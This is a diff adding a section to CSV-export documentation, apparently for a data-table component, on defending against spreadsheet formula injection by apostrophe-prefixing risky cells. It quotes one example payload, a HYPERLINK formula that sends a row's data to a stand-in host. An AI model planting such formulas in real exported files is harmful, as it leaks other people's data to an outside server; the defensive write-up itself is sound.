@@ -122,6 +122,16 @@ The escaping is RFC 4180 and it is four rules — a field is quoted if it holds 
 
 The file leads with a byte-order mark, and not as a nicety: Excel reads a UTF-8 CSV without one as the local code page, so every non-ASCII name in it arrives as mojibake. Every other reader ignores the mark.
 
+### A cell a spreadsheet would run
+
+RFC 4180 has nothing to say about the other half of this, which is that a spreadsheet does not read a CSV as data. A cell beginning `=`, `+`, `-` or `@` is a **formula** — and the rows in a data table are usually things other people typed. `=HYPERLINK("https://collect.example/?r="&A1)` sitting in a name column is one click from posting the row beside it to somebody else's server, and it is the reader's own spreadsheet that runs it, so nothing this component does while rendering can reach it. The file is the only place to stop it.
+
+So a cell that would be read as a formula goes out with an apostrophe in front. Excel, Sheets and LibreOffice all understand that as "the rest of this is text" and strip it on the way in.
+
+A number keeps its sign. `-5` and `+82 2 555 0100` begin with a formula character and are not formulas, and a table of negative figures whose every cell had been prefixed would be a fix more annoying than the thing it fixed.
+
+`exportEscapeFormulas={false}` turns it off, for the one case where it is wrong: a file going to a parser rather than to a person. A database loader has no apostrophe rule and would take the character as part of the value.
+
 `onExport` takes the text instead of downloading it — to post it somewhere, to open it in a viewer of your own, or to put a sheet around it.
 
 ## What it deliberately does not do
